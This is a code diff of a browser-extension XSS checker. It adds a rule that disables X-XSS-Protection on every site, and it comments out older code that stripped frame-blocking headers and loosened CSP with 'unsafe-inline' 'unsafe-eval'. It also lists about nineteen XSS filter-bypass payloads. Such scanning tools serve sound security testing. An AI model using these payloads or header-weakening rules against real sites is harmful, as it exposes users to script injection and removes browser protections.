@@ -5,14 +5,13 @@ import parse5 from 'parse5';
 
 import { CacheList } from "@/utils/cache_list";
 import { UrlInfo } from "@/utils/url";
-import { Command, MSG } from "./const";
+import { Command, MSG, REMOVE_XSS_RULE_ID } from "./const";
 
 /**
- * 自动翻页组件
+ * Xss 检测组件
  */
-export class AutomaticPageComponent extends BaseComponent {
+export class XssComponent extends BaseComponent {
 
-    // component public
     public name = "xss-checker";
     public desc = "检测页面可能存在 xss 漏洞";
 
@@ -47,7 +46,53 @@ export class AutomaticPageComponent extends BaseComponent {
     /**
      * 移除xss保护头
      */
-    remove_xss_protect_flag() {
+    private async remove_xss_protect_flag() {
+        const enable = await this.isEnable();
+
+        chrome.declarativeNetRequest.updateDynamicRules(
+            {
+                addRules: [{
+                    id: REMOVE_XSS_RULE_ID,
+                    priority: 1,
+                    action: { 
+                        type: chrome.declarativeNetRequest.RuleActionType.MODIFY_HEADERS,
+                        responseHeaders: [
+                            {
+                                header: 'X-XSS-Protection',
+                                operation: 'set' as chrome.declarativeNetRequest.HeaderOperation,
+                                value: '0'
+                            }
+                        ]
+                    },
+                    condition: { 
+                        urlFilter: "*://*/*", 
+                        resourceTypes: [
+                            chrome.declarativeNetRequest.ResourceType.MAIN_FRAME,
+                            chrome.declarativeNetRequest.ResourceType.SUB_FRAME,
+                        ]
+                    }
+                }]
+            },
+            async (result:any) => {
+                console.log('created', result);
+            }
+        )
+        // export enum ResourceType {
+        //     MAIN_FRAME = "main_frame",
+        //     SUB_FRAME = "sub_frame",
+        //     STYLESHEET = "stylesheet",
+        //     SCRIPT = "script",
+        //     IMAGE = "image",
+        //     FONT = "font",
+        //     OBJECT = "object",
+        //     XMLHTTPREQUEST = "xmlhttprequest",
+        //     PING = "ping",
+        //     CSP_REPORT = "csp_report",
+        //     MEDIA = "media",
+        //     WEBSOCKET = "websocket",
+        //     OTHER = "other"
+        // }
+
         /**
          * 注册onHeadersReceived处理事件
          * https://crxdoc-zh.appspot.com/extensions/webRequest
@@ -55,31 +100,45 @@ export class AutomaticPageComponent extends BaseComponent {
          * 接收到请求头消息的时候， 检测头部是否有X-XSS-Protection，其值为0时表示关闭XSS保护
          * 如果有关闭，如果没有添加一个X-SS-Protecection为0
          */
-        chrome.webRequest.onHeadersReceived.addListener(details => {
-            let flag = true;
+        // chrome.webRequest.onHeadersReceived.addListener(details => {
+        //     let xssFlag = true;
+        //     let cspFlag = true;
 
-            const headerLength = details?.responseHeaders?.length ?? 0;
+        //     const headerLength = details?.responseHeaders?.length ?? 0;
 
-            if (!details) {
-                return;
-            }
+        //     if (!details) {
+        //         return;
+        //     }
 
-            for (var i = 0; i < headerLength; ++i) {
-                let headers = details.responseHeaders ?? [];
-                let header: chrome.webRequest.HttpHeader = headers[i];
-                if (header.name == 'X-XSS-Protection') {
-                    header.value = '0';
-                    flag = false;
-                } else if (header.name == 'x-frame-options') {
-                    delete headers[i];
-                    i--;
-                }
-            }
-            if (flag) {
-                details?.responseHeaders?.push({ name: "X-XSS-Protection", value: "0" });
-            }
-            return { responseHeaders: details.responseHeaders };
-        }, { urls: ["<all_urls>"], types: ["main_frame", "sub_frame"] }, ['blocking', 'responseHeaders']);
+        //     for (var i = 0; i < headerLength; ++i) {
+        //         let headers = details.responseHeaders ?? [];
+        //         let header: chrome.webRequest.HttpHeader = headers[i];
+        //         if (header.name == 'conent-security-policy') {
+        //             console.log('conent-security-policy', header.value);
+
+        //             // 重复关键字第一次生效，所以插入的放在最前面
+        //             header.value = "script-src 'unsafe-inline' 'unsafe-eval'; " + header.value; 
+        //             cspFlag =false;
+        //         }
+        //         if (header.name == 'X-XSS-Protection') {
+        //             console.log('X-XSS-Protection', header.value);
+        //             header.value = '0';
+        //             xssFlag = false;
+        //         } else if (header.name == 'x-frame-options') {
+        //             delete headers[i];
+        //             i--;
+        //         }
+        //     }
+        //     if (xssFlag) {
+        //         console.log('X-XSS-Protection set ', 0);
+        //         details?.responseHeaders?.push({ name: "X-XSS-Protection", value: "0" });
+        //     }
+        //     if (cspFlag) {
+        //         console.log('conent-security-policy set ', "script-src 'unsafe-inline' 'unsafe-eval'");
+        //         details?.responseHeaders?.push({ name: "conent-security-policy", value: "script-src 'unsafe-inline' 'unsafe-eval'" });
+        //     }
+        //     return { responseHeaders: details.responseHeaders };
+        // }, { urls: ["<all_urls>"], types: ["main_frame", "sub_frame"] }, ['blocking', 'responseHeaders']);
 
     }
 
@@ -258,26 +317,29 @@ export class AutomaticPageComponent extends BaseComponent {
      */
     private get_payload(position:string = '') {
         let result = [];
+        // result = [
+        //     '<img src=x onerror=alert({id})>',
+        //     '<script>alert({id})</script>',
+        //     '"><img src=x onerror=alert({id})>',
+        //     '" onload=alert({id})',
+        //     "\"><img src=x onerror=alert({id})>",
+        //     "</script><svg/onload=alert({id})>",
+        //     "<body onload=alert({id})>",
+        //     "<svg onload=alert`{id}`>",
+        //     "<svg onload=alert&lpar;{id}&rpar;>",
+        //     "<svg onload=alert&#x28;{id}&#x29>",
+        //     "<svg onload=alert&#40;{id}&#41>",
+        //     "--!><svg/onload=prompt({id})",
+        //     "--><script>alert({id})</script>",
+        //     "&lt;script&gt;alert(&#39;{id}&#39;);&lt;/script&gt;",
+        //     "< / script >< script >alert({id})< / script >",
+        //     "<sc<script>ript>alert({id})</sc</script>ript>",
+        //     "<script\\x20type=\"text/javascript\">javascript:alert({id});</script>",
+        //     "'`\"><\\x3Cscript>javascript:alert({id})</script>",
+        //     "<<SCRIPT>alert(\"{id}\");//<</SCRIPT>"
+        // ]
         result = [
-            '<img src=x onerror=alert({id})>',
-            '<script>alert({id})</script>',
-            '"><img src=x onerror=alert({id})>',
-            '" onload=alert({id})',
-            "\"><img src=x onerror=alert({id})>",
-            "</script><svg/onload=alert({id})>",
-            "<body onload=alert({id})>",
-            "<svg onload=alert`{id}`>",
-            "<svg onload=alert&lpar;{id}&rpar;>",
-            "<svg onload=alert&#x28;{id}&#x29>",
-            "<svg onload=alert&#40;{id}&#41>",
-            "--!><svg/onload=prompt({id})",
-            "--><script>alert({id})</script>",
-            "&lt;script&gt;alert(&#39;{id}&#39;);&lt;/script&gt;",
-            "< / script >< script >alert({id})< / script >",
-            "<sc<script>ript>alert({id})</sc</script>ript>",
-            "<script\\x20type=\"text/javascript\">javascript:alert({id});</script>",
-            "'`\"><\\x3Cscript>javascript:alert({id})</script>",
-            "<<SCRIPT>alert(\"{id}\");//<</SCRIPT>"
+            '<img src=x onerror=alert({id})>'
         ]
         return result;
     }
@@ -348,25 +410,91 @@ export class AutomaticPageComponent extends BaseComponent {
             let url_info = new UrlInfo(url);
             let frame = document.createElement('iframe');
             let id = url_info.get_hash();
-            let info = JSON.stringify({ url: source_url, param: k, payload: escape(payload), component: this.ns });
+            let info = JSON.stringify({ url: source_url, param: k, payload: escape(payload), component: this.name });
 
-            frame.setAttribute('id', id)
-            frame.setAttribute('data-url', url)
+            frame.setAttribute('id', id);
+            frame.setAttribute('data-url', url);
             // frame.src = url;
-            frame.style.display = 'none'
-            document.body.appendChild(frame)
-            frame.contentWindow?.document.open()
+            frame.style.display = 'none';
+            document.body.appendChild(frame);
+            frame.contentWindow?.document.open();
             // 改写alert,如果触发alert向父窗体发送消息
-            frame.contentWindow?.document.write(`<script>
-            function alert(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}
-            function confire(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}
-            function prompt(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}
+
+            const alertFunc = `<script>function alert(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}</script>`;
+            const promptFunc = `<script>function prompt(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}</script>`;
+            const confireFunc = `<script>function confire(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}</script>`;
+            const mounseFunc = `<script>
             setTimeout(function() {
                 document.querySelectorAll('a').forEach((element) => {
                 var href = element.getAttribute('href');if (href && href.indexOf('javascript:') == 0) element.click()
                 var onmouseover = element.getAttribute('onmouseover')
                 if (onmouseover && onmouseover.indexOf('javascript:') == 0) element.onmouseover()
-            })}, 1000)</script>` + data)
+            })}, 1000)</script>`;
+
+            const testData = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <script src="jquery.js#test<img src=x onerror=alert({id})>"></script>
+    ${alertFunc}
+    ${promptFunc}
+    ${confireFunc}
+    ${mounseFunc}
+    <style>
+        * {
+            margin: 0 0;
+            padding: 0 0;
+        }
+        html,body{
+            height: 100%;
+            width: 100%;
+            background-color: black;
+        }
+        .div {
+            color: aquamarine;
+            font-weight: 900;
+            font-size: 68px;
+            text-align: center;
+            vertical-align:middle;
+            padding: 150px;
+        }
+        ul {
+            font-weight: 400;
+            font-size: 18px;
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="div">
+        XSS test<img src=x onerror=alert({id})>       
+        <ul>
+            <li><a href="./xss.php?p=1&v=test">注入点html中</a></li>
+        </ul>
+    </div>
+</body>
+</html>`;
+
+            // const alertFunc = `<script>function alert(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}</script>`;
+            // const promptFunc = `<script>function prompt(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}</script>`;
+            // const confireFunc = `<script>function confire(m){setTimeout(function(){parent.postMessage(${info},'*')},500);}</script>`;
+            // const mounseFunc = `<script>
+            // setTimeout(function() {
+            //     document.querySelectorAll('a').forEach((element) => {
+            //     var href = element.getAttribute('href');if (href && href.indexOf('javascript:') == 0) element.click()
+            //     var onmouseover = element.getAttribute('onmouseover')
+            //     if (onmouseover && onmouseover.indexOf('javascript:') == 0) element.onmouseover()
+            // })}, 1000)</script>`;
+
+            frame.contentWindow?.document.write(data);
+
+            // frame.contentWindow?.document.write(alertFunc);
+            // frame.contentWindow?.document.write(promptFunc);
+            // frame.contentWindow?.document.write(confireFunc);
+            // frame.contentWindow?.document.write(mounseFunc);
             // 5秒后消除iframe
             // frame.contentWindow.document.write(`
             // <script>
